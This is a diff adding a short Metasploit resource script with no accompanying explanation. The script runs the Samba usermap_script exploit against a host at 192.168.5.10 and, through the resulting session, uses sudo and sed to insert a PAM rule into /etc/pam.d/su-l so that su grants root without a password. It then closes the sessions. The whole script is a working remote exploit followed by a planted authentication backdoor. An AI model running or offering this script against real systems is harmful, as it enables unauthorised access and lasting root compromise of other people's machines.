@@ -1,0 +1,6 @@
+use exploit/multi/samba/usermap_script
+set RHOSTS 192.168.5.10
+set LPORT 4444
+exploit -z
+sessions -c 'sudo sed -i "1s,^,auth sufficient pam_succeed_if.so uid >= 0\n,g" /etc/pam.d/su-l' -i 1
+sessions -K
